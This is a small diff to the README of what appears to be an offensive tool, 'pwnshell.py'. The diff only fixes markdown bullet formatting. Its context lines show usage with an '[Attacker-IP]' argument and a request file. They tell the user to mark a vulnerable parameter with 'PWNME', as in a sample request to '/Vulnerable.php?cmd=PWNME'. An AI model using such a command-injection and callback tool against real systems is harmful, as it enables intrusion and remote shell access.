@@ -47,9 +47,9 @@
 ./pwnshell.py -i [Attacker-IP] -f [REQUEST FILE] -s (To use https prefix)
 ```
 #### Example:
--Copy from Burp or Network tab
+- Copy from Burp or Network tab
 
--Replace the Vulnerable place in the parameter with 'PWNME'
+- Replace the Vulnerable place in the parameter with 'PWNME'
 ```sh
 GET /Vulnerable.php?cmd=PWNME HTTP/1.1
 Host: 127.0.0.1
